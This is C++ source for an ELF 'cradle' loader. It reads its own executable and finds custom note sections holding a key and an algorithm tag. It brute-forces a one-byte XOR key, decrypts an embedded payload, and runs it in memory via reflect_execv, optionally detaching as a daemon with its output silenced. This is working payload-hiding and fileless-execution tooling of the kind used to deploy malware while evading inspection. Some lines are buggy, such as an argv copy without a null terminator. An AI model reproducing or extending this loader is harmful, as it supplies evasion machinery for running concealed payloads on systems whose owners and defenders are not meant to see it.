#include <elfldr.h>

using namespace std;
using namespace ELFIO;

int main(int argc, char **argv) {

    char *psec_name = (char *) PSEC_NAME;
    char *ksec_name = (char *) KSEC_NAME;
    unsigned int psec_num = 0, ksec_num = 0;
    unsigned long psec_size = 0, ksec_size = 0;

    void *key_data = nullptr;
    void *algo_data = nullptr;
    void *p_data = nullptr;

    Elf_Word key_data_sz, algo_data_sz, p_data_sz;
    elfio reader;

    bool do_daemon = false;
    // Options
    int m, n, l, ch, a = 0 ;

    for( n = 1; n < argc; n++ )            /* Scan through args. */
    {
        switch( (int)argv[n][0] )            /* Check for option character. */
        {
            case '-':
                l = (int) strlen( argv[n] );
                for( m = 1; m < l; ++m ) /* Scan through options. */
                {
                    ch = (int)(unsigned char)argv[n][m];
                    switch( ch )
                    {
                        case 'd':
                            printf( "Option: daemonize %c\n", ch );
                            do_daemon = true;
                            break;
                        case '-':
                            printf( "Option: double dash %c\n", ch );
                            // End opts, skip counting
                            ++a;
                            goto end_opts;
                        default:
                            err(EXIT_FAILURE, "Illegal option in command %c\n", ch);
                            break;
                    }
                }
                break;
            default:
                break;
        }
        ++a; // how many args processed
    }

    end_opts:

    printf("Arguments to skip for exec: %d\n", a);


    // allocate memory and copy strings
    printf ("Argc = %d , a = %d, allocating (argc -a +1 ) %d elements\n", argc,  a, argc -a );
    char** new_argv = (char **) malloc((argc - a +1 ) * sizeof *new_argv);

    // Set up argv[0]
    new_argv[0] = (char *)(malloc(strlen(argv[0])));
    memcpy(new_argv[0], argv[0], strlen(argv[0]));

    // Setup paylaod exec args, skipping cradle args
    for(int skip = a, i = 1; i < argc -a  ; ++i)
    {
        printf("=========\n");
        printf("\tSkip = %d, i = %d \n", skip, i);
        printf("\tPos: %d (skip + i)  strlen(argv[skip +i] +1) is %zu  \n",skip + i, strlen(argv[skip + i]+1));
        size_t length = strlen(argv[skip + i])+1;
        printf("\tnew_argv[i] where i = %d  allocated %zu  \n", i, length);
        new_argv[i] = (char *)(malloc(length));
        printf("\tmemcpy to new_argv[i] where i = %d  from argv[skip + i] where skip = %d + i  len: %zu  \n", i, skip, length);
        memcpy(new_argv[i], argv[skip + i], length);
    }
    printf("new_argv[argc - a ] where argc = %d , a = %d \n", argc, a);
    new_argv[argc - a ] = nullptr;

    // do operations on new_argv
    for(int i = 0; i < argc - a; ++i)
    {
        printf("Arg: %s\n", new_argv[i]);
    }

    // What is the path of this exe running
    filesystem::path my_path = get_executable_path();

    // Load host ELF data
    if (!reader.load(my_path)) {
        cerr << "Can't find or process src ELF file: " << argv[0] << endl;
        exit(AFAULT);
    }

    // Find section with keys and algo
    if (find_section_by_name(reader, ksec_name, &ksec_num, &ksec_size) == TRUE) {
        cout << "Found section " << ksec_name << " at position " << ksec_num << " of size: " << ksec_size << endl;
        if (get_ksection_data(reader, ksec_num, &key_data, &key_data_sz, &algo_data, &algo_data_sz) == TRUE) {

            // Find section with data
            if (find_section_by_name(reader, psec_name, &psec_num, &psec_size) == TRUE) {
                cout << "Found section " << psec_name << " at position " << psec_num << " of size: " << psec_size
                     << endl;
                if (get_psection_data(reader, psec_num, &p_data, &p_data_sz) == TRUE) {
                    cout << "Dumping p_data: " << endl;
                    if (strcmp((char *) algo_data, "X") == 0) {

                        // Find decryption key
                        printf("Bruteforcing the decryption key...\n");
                        unsigned int k = 0;
                        for (unsigned int i = 0; i < 0xFFFFFFFF; i++) {
                            // Rotate back and get lower bits
                            if ((rightRotate(*((unsigned char *) key_data), KSEC_BITSHIFT_POS) ^ i) ==
                                KSEC_CANARY_CHAR &&
                                (rightRotate(*((unsigned char *) key_data + 1), KSEC_BITSHIFT_POS) ^ i) ==
                                KSEC_CANARY_CHAR &&
                                (rightRotate(*((unsigned char *) key_data + 2), KSEC_BITSHIFT_POS) ^ i) ==
                                KSEC_CANARY_CHAR &&
                                (rightRotate(*((unsigned char *) key_data + 3), KSEC_BITSHIFT_POS) ^ i) ==
                                KSEC_CANARY_CHAR
                                    ) {
                                k = i & 0xFF;
                                break;
                            }
                        }

                        if (k == 0) {
                            err(EXIT_FAILURE, "Keyspace does not contain key");
                        } else {
                            cout << "Key  found " << hex << k << endl;
                        }

                        // XOR method
                        cout << "De-XOR ... " << endl;
                        uxor_buffer((unsigned char **) (&p_data), (unsigned long) p_data_sz, k);

                        // cout << "Dumping to disk ... " << endl;
                        // dump_buffer(p_data, p_data_sz, (char *) "/tmp/lspay.dmp");

                        cout << "Reflect exec ... " << endl;
                        // TODO: check condition for daemonizing
                        if (do_daemon){
                            daemonize( (unsigned char const  *) p_data, &new_argv);
                        }else{
                            reflect_execv( (unsigned char const  *) p_data, new_argv);
                        }
                    } else if (strcmp((char *) algo_data, "A") == 0) {
                        // AES ...
                        ;
                    } else /* default: */
                    {
                        err(EXIT_FAILURE, "%s not in algo choices <X|A>", (char *) algo_data);
                    }
                } else {
                    err(EXIT_FAILURE, "Data context cannot be retrieved for psec_num %d ", psec_num);
                }
            } else {
                // Section not properly setup, TBD
                err(EXIT_FAILURE, "%s not found, last seen sec num: %d", ksec_name, ksec_num);
            }

        } else {
            err(EXIT_FAILURE, "Key context cannot be retrieved for ksec_num %d ", ksec_num);
        }

    } else {
        // Section not properly setup, TBD
        err(EXIT_FAILURE, "%s not found, last seen sec num: %d", ksec_name, ksec_num);
    }

    return 0;
}

bool get_psection_data(ELFIO::elfio &reader,
                       unsigned int psec_num,
                       void **p_data, Elf_Word *p_data_sz) {
    Elf_Word type;
    std::string name;
    bool found = FALSE;

    // There should be at least 2 entries in section: key and algo
    cout << "Checking psec_num: " << psec_num << endl;
    Elf_Word sec_entries_n = get_section_entries_n(reader, psec_num);
    if (sec_entries_n < PSEC_NENTRY) {
        err(EXIT_FAILURE, "ksec ix is %d, < %d", sec_entries_n, PSEC_NENTRY);
    }

    section *note_sec = reader.sections[psec_num];
    note_section_accessor notes_reader(reader, note_sec);

    if (notes_reader.get_note(0x0, type, name, *p_data, *p_data_sz)) {
        // 'name' usually contains \0 at the end. Try to fix it
        name = name.c_str();
        cout << "[" << 0x0 << "]" << " type: " << type << " name: " << name << " " << " Data sz:" << p_data_sz << endl;
        found = TRUE;
    }

    return found;
}

bool get_ksection_data(ELFIO::elfio &reader,
                       unsigned int ksec_num,
                       void **key_data, Elf_Word *key_data_sz,
                       void **algo_data, Elf_Word *algo_data_sz) {
    Elf_Word type;
    std::string name;
    bool found = FALSE;

    // There should be at least 2 entries in section: key and algo
    cout << "Checking ksec_num: " << ksec_num << endl;
    Elf_Word sec_entries_n = get_section_entries_n(reader, ksec_num);
    if (sec_entries_n != KSEC_NENTRY) {
        err(EXIT_FAILURE, "ksec ix is %d, != %d", sec_entries_n, KSEC_NENTRY);
    }

    section *note_sec = reader.sections[ksec_num];
    note_section_accessor notes_reader(reader, note_sec);

    if (notes_reader.get_note(0x0, type, name, *key_data, *key_data_sz)) {
        // 'name' usually contains \0 at the end. Try to fix it
        name = name.c_str();
        cout << "[" << 0x0 << "]" << " type: " << type << " name: " << name << " " << " data: " << key_data << " sz:"
             << key_data_sz << endl;
        found = TRUE;
    }
    if (notes_reader.get_note(0x1, type, name, *algo_data, *algo_data_sz)) {
        // 'name' usually contains \0 at the end. Try to fix it
        name = name.c_str();
        cout << "[" << 0x1 << "]" << " type: " << type << " name: " << name << " " << " data: " << algo_data << " sz:"
             << algo_data_sz << endl;
        found = TRUE;
    }

    return found;
}
void daemonize(unsigned char const  * p_data, char *** args) {

    // Fork, allowing the parent process to terminate.
    pid_t pid = fork();
    if (pid == -1) {
        // after first fork(), unsuccessful. exiting with error.
        err(EXIT_FAILURE, "First fork() unsuccessful");
    } else if (pid != 0) {
        // after first fork() in parent. exiting by choice.
        // TODO: clean up if any
        _exit(0);
    }

    // Start a new session for the daemon.
    if (setsid() == -1) {
        // failed to become a session leader while daemonizing
        ;
        err(EXIT_FAILURE, "setsid() unsuccessful");
    }

    // Fork again, allowing the parent process to terminate.
    signal(SIGCHLD, SIG_IGN); // avoid defunct processes.
    pid = fork();
    if (pid == -1) {
        // after second fork(), unsuccessful. exiting with error.
        err(EXIT_FAILURE, "Second fork() unsuccessful");
    } else if (pid != 0) {
        // after second fork() in parent. exiting by choice.
        // TODO: clean up if any
        _exit(0);
    }

    // Set the current working directory to the root directory.
    chdir(DAEMON_CHDIR); // do nothing if it cannot do so, or maybe attempt to chdir elsewhere

    // Set the user file creation mask to zero.
    umask(0);

    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    // Reopen STDIN/OUT/ERR to Null
    if (open("/dev/null",O_RDONLY) == -1) {
      printf("Daemon: failed to reopen stdin while daemonising (errno=%d)",errno);
    }
    if (open("/dev/null",O_WRONLY) == -1) {
      printf("Daemon: failed to reopen stdout while daemonising (errno=%d)",errno);
    }
    if (open("/dev/null",O_RDWR) == -1) {
         printf ("Daemon: failed to reopen stderr while daemonising (errno=%d)",errno);
    }

    reflect_execv( (unsigned char const  *) p_data, *args);

}
Elf_Word get_section_entries_n(ELFIO::elfio &reader, unsigned int section_number) {
    note_section_accessor notes_reader(reader, reader.sections[section_number]);
    return notes_reader.get_notes_num();
}

std::filesystem::path get_executable_path() {
    return std::filesystem::canonical("/proc/self/exe");
}
